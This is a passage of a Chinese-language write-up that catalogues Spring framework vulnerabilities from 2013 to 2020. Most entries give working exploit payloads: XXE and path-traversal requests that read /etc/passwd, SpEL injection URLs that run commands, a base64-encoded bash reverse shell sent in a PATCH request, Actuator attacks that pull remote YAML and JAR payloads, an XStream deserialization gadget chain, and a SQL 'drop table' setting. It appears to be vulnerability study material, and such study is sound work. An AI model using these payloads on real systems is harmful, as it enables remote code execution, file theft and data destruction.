<code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   &lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;/xml&gt;</code></pre><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h3 id="CVE-2013-7315-Spring-Framework中的XML外部实体"><a href="#CVE-2013-7315-Spring-Framework中的XML外部实体" class="headerlink" title="CVE-2013-7315 Spring Framework中的XML外部实体"></a>CVE-2013-7315 Spring Framework中的XML外部实体</h3><p>影响版本：3.2.0至3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC）</p><p>由于对 <strong>CVE-2013-4152</strong>和<strong>CVE-2013-6429的</strong>修复不完整导致。</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;   &lt;username&gt;John&lt;/username&gt;&lt;/xml&gt;</code></pre><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;   &lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;/xml&gt;</code></pre><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h3 id="CVE-2014-3527-Spring-Security验证绕过漏洞"><a href="#CVE-2014-3527-Spring-Security验证绕过漏洞" class="headerlink" title="CVE-2014-3527 Spring Security验证绕过漏洞"></a>CVE-2014-3527 Spring Security验证绕过漏洞</h3><p>影响版本：</p><pre><code>SpringSource Spring Security 3.1-3.2.4</code></pre><pre><code>当使用从Spring Security 3.1到3.2.4的CAS代理票证身份验证时，恶意的CAS服务可能会欺骗另一个CAS服务来认证未关联的代理票证。这是由于以下事实：代理票证身份验证使用了来自HttpServletRequest的信息，该信息是根据HTTP请求中的不可信信息填充的。这意味着，如果存在CAS服务可以相互认证的访问控制限制，则可以绕过这些限制。如果用户未使用CAS代理票证，并且未基于CAS服务做出访问控制决策，则对用户没有影响。</code></pre><h3 id="CVE-2014-0097-Spring-Security认证绕过"><a href="#CVE-2014-0097-Spring-Security认证绕过" class="headerlink" title="CVE-2014-0097 Spring Security认证绕过"></a>CVE-2014-0097 Spring Security认证绕过</h3><p>影响版本：Spring Security 3.2.0至3.2.1和3.1.0至3.1.5</p><pre><code>ActiveDirectoryLdapAuthenticator不检查密码长度。如果目录允许匿名绑定，则它可能会错误地验证提供空密码的用户。</code></pre><h3 id="CVE-2014-3578-Spring-Framework-目录遍历漏洞"><a href="#CVE-2014-3578-Spring-Framework-目录遍历漏洞" class="headerlink" title="CVE-2014-3578 Spring Framework 目录遍历漏洞"></a>CVE-2014-3578 Spring Framework 目录遍历漏洞</h3><p>影响版本：</p><pre><code>Spring Framework:- 3.0.4 to 3.2.11- 4.0.0 to 4.0.7- 4.1.0 to 4.1.1</code></pre><p>在web.xml存在如下情况下存在目录遍历：</p><pre><code>&lt;mvc:resources mapping=&quot;/css/**&quot; location=&quot;file:webapps/springapp/WEB-INF/classes/theme/css/&quot; /&gt;</code></pre><p>访问：</p><pre><code>GET /springapp/css/file:/etc/passwd</code></pre><h3 id="CVE-2016-2173-Spring-AMQP中的远程代码执行"><a href="#CVE-2016-2173-Spring-AMQP中的远程代码执行" class="headerlink" title="CVE-2016-2173 Spring AMQP中的远程代码执行"></a>CVE-2016-2173 Spring AMQP中的远程代码执行</h3><p>影响版本：1.0.0至1.5.4</p><p><a href="https://github.com/HaToan/CVE-2016-2173" target="_blank" rel="noopener">https://github.com/HaToan/CVE-2016-2173</a></p><p>使用方式：</p><pre><code>- ysoserial-0.0.4-all.jar create payload write and execute a shell    + java -jar ysoserial-0.0.4-all.jar &#39;library_vul&#39; &#39;command&#39;- exploit-cve2016-2173.jar : send to App vul    + java -jar exploit-cve2016-2173.jar </code></pre><p>本来想根据配置来搭一个环境处理，结果环境一直搭不起来，构建各种失败，就先放这个利用poc把。</p><h3 id="CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞"><a href="#CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞" class="headerlink" title="CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞"></a>CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞</h3><p>影响版本：2.0.0-2.0.9、1.0.0-1.0.5</p><p><a href="https://www.seebug.org/vuldb/ssvid-92474" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92474</a></p><p>漏洞利用POC：</p><pre><code>http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=${2334-1}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131645.png" alt="image-20200331090423266"></p><p>执行命令：</p><pre><code>http://207.246.79.196:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=${T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)}</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131647.png" alt="image-20200331092210362"></p><p>但是此命令执行，不会在页面上显示，只会打印出运行的对象。</p><p>如果要执行反弹shell等命令，由于页面HTML编码的原因，SPEL返回值时进行了一次html编码，所以导致取出的  值时会进行一次转义，利用如下脚本加工。</p><pre><code>#coding:utf-8message = input(&#39;Enter message to encode:&#39;)print(&#39;Decoded string (in ASCII):\n&#39;)print(&#39;T(java.lang.Character).toString(%s)&#39; % ord(message[0]), end=&quot;&quot;)for ch in message[1:]:   print(&#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch), end=&quot;&quot;), print(&#39;\n&#39;)print(&#39;new java.lang.String(new byte[]{&#39;, end=&quot;&quot;),print(ord(message[0]), end=&quot;&quot;)for ch in message[1:]:   print(&#39;,%s&#39; % ord(ch), end=&quot;&quot;), print(&#39;)}&#39;)</code></pre><p>执行输出后再添加：</p><pre><code>T(java.lang.Runtime).getRuntime().exec(payload)</code></pre><h3 id="CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞"><a href="#CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞" class="headerlink" title="CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞"></a>CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞</h3><p>影响版本：1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p><p><a href="https://www.cnblogs.com/litlife/p/10183137.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html</a></p><p>下载存在漏洞的版本1.3.0：<a href="https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip</a></p><p>POC：</p><pre><code>/?payload=${new%20java.lang.String(new%20byte[]{70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66})}结果：FBB204A4061FFBD41284A84C258C1BFB返回结果是md5(wooyun)</code></pre><h3 id="CVE-2016-6652-Spring-Data-JPA-SQL盲注"><a href="#CVE-2016-6652-Spring-Data-JPA-SQL盲注" class="headerlink" title="CVE-2016-6652 Spring Data JPA SQL盲注"></a>CVE-2016-6652 Spring Data JPA SQL盲注</h3><p>影响版本：Spring Data JPA 1.10.2、1.9.4</p><p><a href="https://www.seebug.org/vuldb/ssvid-92534" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92534</a></p><h3 id="CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞"><a href="#CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞" class="headerlink" title="CVE-2017-4971 Spring WebFlow 远程代码执行漏洞"></a>CVE-2017-4971 Spring WebFlow 远程代码执行漏洞</h3><p>影响版本：Spring Web Flow 2.4.0 to 2.4.4</p><p>使用vulhub搭建环境后，在添加poc执行</p><pre><code>&amp;_(new+java.lang.ProcessBuilder(&quot;ping&quot;,&quot;xxx.ceye.io&quot;)).start()=vulhub</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131651.png" alt="image-20200331111056698"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131653.png" alt="image-20200331111146008"></p><p>无害化payload检测，如果 response header 中出现 vulnerable 头，则有漏洞：</p><pre><code>&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131655.png" alt="image-20200331111225481"></p><h3 id="CVE-2017-8045-Spring-Amqp中的远程代码执行"><a href="#CVE-2017-8045-Spring-Amqp中的远程代码执行" class="headerlink" title="CVE-2017-8045 Spring Amqp中的远程代码执行"></a>CVE-2017-8045 Spring Amqp中的远程代码执行</h3><p>影响版本：1.7.4、1.6.11和1.5.7之前的Spring AMQP版本</p><p><a href="https://xz.aliyun.com/t/36" target="_blank" rel="noopener">https://xz.aliyun.com/t/36</a></p><h3 id="CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码"><a href="#CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码" class="headerlink" title="CVE-2017-8046 Spring Data REST PATCH请求远程执行代码"></a>CVE-2017-8046 Spring Data REST PATCH请求远程执行代码</h3><p>影响版本：Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本、Spring Data release trains Kay-RC3之前的版本、Spring Boot 2.0.0M4之前的版本</p><p><a href="https://www.cnblogs.com/co10rway/p/9380441.html" target="_blank" rel="noopener">https://www.cnblogs.com/co10rway/p/9380441.html</a></p><p>利用POC执行：</p><pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;ping xxx.ceye.io&#39;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; }]</code></pre><p>反弹shell，其中反弹shell命令需要借助编码来减少重定向出错的问题<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">java.lang.Runtime.exec() Payload Workarounds</a>：</p><pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ==}|{base64,-d}|{bash,-i}&#39;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; }]</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131657.png" alt="image-20200331114458798"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131700.png" alt="image-20200331115328723"></p><h3 id="CVE-2018-1258-Spring-Security未经授权的访问"><a href="#CVE-2018-1258-Spring-Security未经授权的访问" class="headerlink" title="CVE-2018-1258 Spring Security未经授权的访问"></a>CVE-2018-1258 Spring Security未经授权的访问</h3><p>影响版本：Spring Framework 5.0.5.RELEASE和Spring Security（任何版本）</p><p>暂无详细信息</p><h3 id="CVE-2018-1259-具有XMLBeam的Spring-DataXXE"><a href="#CVE-2018-1259-具有XMLBeam的Spring-DataXXE" class="headerlink" title="CVE-2018-1259 具有XMLBeam的Spring DataXXE"></a>CVE-2018-1259 具有XMLBeam的Spring DataXXE</h3><p>影响版本：</p><pre><code>XMLBeam 1.4.14或更早版本结合使用的Spring Data CommonsSpring Data Commons 1.13至1.13.11（Ingalls SR11）Spring Data REST 2.6至2.6.11（Ingalls SR11）Spring Data Commons 2.0至2.0.6（Kay SR6）Spring Data REST 3.0至3.0.6（Kay SR6）</code></pre><p><a href="http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/</a></p><p><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">https://xz.aliyun.com/t/2341</a></p><h3 id="CVE-2018-1270-Spring-Messaging远程代码执行漏洞"><a href="#CVE-2018-1270-Spring-Messaging远程代码执行漏洞" class="headerlink" title="CVE-2018-1270 Spring Messaging远程代码执行漏洞"></a>CVE-2018-1270 Spring Messaging远程代码执行漏洞</h3><p>影响版本：Spring Framework 5.0 to 5.0.4。Spring Framework 4.3 to 4.3.14</p><p>同样利用vulhub搭建环境，首先我们先拦截connect，查看通过的ws包，点击后会有这么一个请求</p><pre><code>ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131702.png" alt="image-20200331163229079"></p><p>从bp中看到来回四个包，其中的内容为如上所示，修改如下请求包</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131704.png" alt="image-20200331170304494"></p><p>在发送任意消息，即可触发</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131707.png" alt="image-20200331170357879"></p><p>或者尝试使用vulhub提供的脚本，但是此脚本并不具备通用性，需要修改使用<a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py" target="_blank" rel="noopener">poc</a></p><h3 id="CVE-2018-1271-Spring-MVC-目录穿越漏洞"><a href="#CVE-2018-1271-Spring-MVC-目录穿越漏洞" class="headerlink" title="CVE-2018-1271 Spring MVC 目录穿越漏洞"></a>CVE-2018-1271 Spring MVC 目录穿越漏洞</h3><p>当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。</p><p>此漏洞触发条件较高：</p><ol><li>Server运行于Windows系统上</li><li>从文件系统提供的文件服务（比如使用file协议，但不是file open）</li><li>没有使用CVE-2018-1199漏洞的补丁</li><li>不使用Tomcat或者是WildFly做Server</li></ol><p>漏洞利用和复现: </p><p><a href="https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/</a></p><h3 id="CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞"><a href="#CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞" class="headerlink" title="CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞"></a>CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞</h3><p>影响版本：</p><pre><code>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)Spring Data Commons 2.0 to 2.0.5 (Kay SR5)Spring Data REST 3.0 - 3.0.5 (Kay SR5)</code></pre><p><a href="https://www.cnblogs.com/hac425/p/9656747.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9656747.html</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131709.png" alt="image-20200331171801189"></p><p>POC：</p><pre><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=xxxusername[T(java.lang.Runtime).getRuntime().exec(&quot;ping+xxx.ceye.io&quot;)]=test</code></pre><h3 id="CVE-2018-1260-Spring-Security-Oauth2-远程代码执行"><a href="#CVE-2018-1260-Spring-Security-Oauth2-远程代码执行" class="headerlink" title="CVE-2018-1260 Spring Security Oauth2 远程代码执行"></a>CVE-2018-1260 Spring Security Oauth2 远程代码执行</h3><p>影响版本：</p><pre><code>Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14</code></pre><p><a href="https://www.seebug.org/vuldb/ssvid-97287" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97287</a></p><p>此漏洞和CVE-2016-4977类似</p><p>POC：</p><pre><code>http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.baidu.com&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20r9rub4.ceye.io%22%29%7D</code></pre><h3 id="CVE-2018-15758-spring-security-oauth2权限提升"><a href="#CVE-2018-15758-spring-security-oauth2权限提升" class="headerlink" title="CVE-2018-15758 spring-security-oauth2权限提升"></a>CVE-2018-15758 spring-security-oauth2权限提升</h3><p>影响版本：</p><pre><code>Spring Security OAuth 2.3至2.3.3Spring Security OAuth 2.2至2.2.2Spring Security OAuth 2.1至2.1.2Spring Security OAuth 2.0到2.0.15</code></pre><p>使用了EnableResourceServer并且用了<code>AuthorizationRequest</code>的话。那么攻击者可以重新发送一次用过的验证请求，或者进行相应参数修改，从而造成权限提升。</p><p>例如劫持code，并且篡改其中的scope到all的话：</p><pre><code>http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://127.0.0.1&amp;scope=openid</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131712.png" alt="image-20200401094048949"></p><p>即授权了读取权限的时候，修改为all就可以获得全部权限。</p><h3 id="CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历"><a href="#CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历" class="headerlink" title="CVE-2019-3799 Spring Cloud Config Server: 目录遍历"></a>CVE-2019-3799 Spring Cloud Config Server: 目录遍历</h3><p>影响版本：Spring-Cloud-Config-Server  &lt; 2.1.2, 2.0.4, 1.4.6</p><p>下载受影响的版本构建：<a href="https://github.com/spring-cloud/spring-cloud-config" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config</a></p><pre><code>cd spring-cloud-config-server                                                                   ../mvnw spring-boot:run</code></pre><p>构建成功后访问：</p><pre><code>http://127.0.0.1:8888/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd    </code></pre><p><img src="Spring 漏洞.assets/image-20200401100511941.png" alt="image-20200401100511941"></p><p>其中路径代表：<code>/{name}/{profile}/{label}/</code>，如下中所显示的json。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131715.png" alt="image-20200401102213915"></p><h3 id="CVE-2019-3778-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-3778-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-3778 Spring Security OAuth 开放重定向"></a>CVE-2019-3778 Spring Security OAuth 开放重定向</h3><p>影响版本：</p><pre><code>Spring Security OAuth 2.3 to 2.3.4Spring Security OAuth 2.2 to 2.2.3Spring Security OAuth 2.1 to 2.1.3Spring Security OAuth 2.0 to 2.0.16</code></pre><p><a href="https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70" target="_blank" rel="noopener">https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70</a></p><p>用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。</p><p>例如原始请求如下：</p><pre><code>/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://localhost:8086/login</code></pre><p>只需要修改为：</p><pre><code>/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://%localhost:8086/login</code></pre><p>这样就不会产生原本的认证错误，而且直接跳转到地址</p><pre><code>Location: http://localhost:8086/login</code></pre><h3 id="CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞"><a href="#CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞" class="headerlink" title="CNVD-2019-11630 Spring Boot Actuator命令执行漏洞"></a>CNVD-2019-11630 Spring Boot Actuator命令执行漏洞</h3><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#</a></p><p>这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点</p><ol><li>Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。</li></ol><pre><code>/dump-显示线程转储（包括堆栈跟踪）/trace-显示最后几条HTTP消息（其中可能包含会话标识符）/logfile-输出日志文件的内容/shutdown-关闭应用程序/mappings-显示所有MVC控制器映射/env-提供对配置环境的访问/restart-重新启动应用程序</code></pre><ol start="2"><li>jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：<a href="http://127.0.0.1:8090/jolokia/list" target="_blank" rel="noopener">http://127.0.0.1:8090/jolokia/list</a></li></ol><p>Logback库提供的<strong>reloadByURL</strong>操作使我们可以从外部URL重新加载日志配置，地址如：</p><pre><code>http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xmllogback.xml：&lt;configuration&gt;  &lt;insertFromJNDI env-entry-name=&quot;ldap://artsploit.com:1389/jndi&quot; as=&quot;appName&quot; /&gt;&lt;/configuration&gt;</code></pre><p>reloadByURL功能从<a href="http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。" target="_blank" rel="noopener">http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。</a></p><ol start="3"><li>通过/env来修改配置</li></ol><p>如果Spring Cloud Libraries在类路径中，则<strong>‘/ env’</strong>端点允许您修改Spring环境属性。</p><pre><code class="html">POST /env HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 65eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream</code></pre><p>此属性将Eureka serviceURL修改为任意值。Eureka Server通常用作发现服务器，目标类路径中具有Eureka-Client &lt;1.8.7，则可以利用其中的<strong>XStream反序列化漏洞</strong>。</p><p>其中xstream的内容类似如下：</p><pre><code>&lt;linked-hash-set&gt;  &lt;jdk.nashorn.internal.objects.NativeString&gt;    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;      &lt;dataHandler&gt;        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;command&gt;                      &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;                    &lt;/command&gt;                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                  &lt;/next&gt;                &lt;/iter&gt;                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                  &lt;method&gt;                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                    &lt;name&gt;start&lt;/name&gt;                    &lt;parameter-types/&gt;                  &lt;/method&gt;                  &lt;name&gt;foo&lt;/name&gt;                &lt;/filter&gt;                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;              &lt;/serviceIterator&gt;              &lt;lock/&gt;            &lt;/cipher&gt;            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;            &lt;ibuffer&gt;&lt;/ibuffer&gt;          &lt;/is&gt;        &lt;/dataSource&gt;      &lt;/dataHandler&gt;    &lt;/value&gt;  &lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;</code></pre><p>然后调用’/ refresh’端点。</p><ol start="4"><li>有一种通过Spring环境属性修改来实现RCE的更可靠方法：</li></ol><pre><code class="html">POST /env HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 59spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml</code></pre><p>该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。</p><pre><code class="html">POST /refresh HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p>从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：</p><pre><code class="html">!!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL [&quot;http://artsploit.com/yaml-payload.jar&quot;]  ]]]</code></pre><p>该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p><ol start="5"><li>/env配置</li></ol><p>除了关于执行RCE的地方，还有一些设置也很有用。</p><p><strong>spring.datasource.tomcat.validationQuery = drop + table + users-</strong>允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。</p><p><strong>spring.datasource.tomcat.url</strong> = jdbc:hsqldb:<a href="https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。" target="_blank" rel="noopener">https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。</a></p><p>这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。</p><h3 id="CVE-2019-11269-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-11269-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-11269 Spring Security OAuth 开放重定向"></a>CVE-2019-11269 Spring Security OAuth 开放重定向</h3><p>此漏洞为CVE-2019-3778的延伸版本，效果一致</p><p>影响版本：</p><pre><code>Spring Security OAuth 2.3至2.3.5Spring Security OAuth 2.2至2.2.4Spring Security OAuth 2.1至2.1.4Spring Security OAUth 2.0至2.0.17</code></pre><h3 id="CVE-2020-5398-Spring-Framework-RFD漏洞"><a href="#CVE-2020-5398-Spring-Framework-RFD漏洞" class="headerlink" title="CVE-2020-5398 Spring Framework RFD漏洞"></a>CVE-2020-5398 Spring Framework RFD漏洞</h3><p>影响版本： Spring Framework, versions 5.2.0 to 5.2.3, 5.1.0 to 5.1.13, 5.0.0 to 5.0.16</p><p>触发此漏洞的要求可以控制<code>content-disposition</code>文件名和扩展名来下载文件。触发的类型有些类似钓鱼文件。</p><pre><code>&lt;a href=”https://&lt;trusted-server&gt;.com/api/users/&lt;attacker_id&gt;.cmd&quot; download&gt;Click me, Im a dolphin&lt;/a&gt;</code></pre><p>先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。</p><p>由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。</p><p>spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。</p><p>当受害者点击如上的地址时，会下载一个&lt;attacker_id&gt;.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。</p><p>但是这个设置可以绕过，采用如下形式：</p><pre><code>filename：secure_install.cmd&quot;;</code></pre><p>会在表头中闭合造成如下效果：</p><pre><code>Content-Disposition: attachment; filename=&quot;secure_install.cmd&quot;;.txt&quot;</code></pre><p>从而达到绕过限制来下载预先设定好的可执行文件等。</p><h3 id="CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露"><a href="#CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露" class="headerlink" title="CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露"></a>CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露</h3><p>影响版本：spring-cloud-config-server &lt; 2.2.2</p><p><a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md" target="_blank" 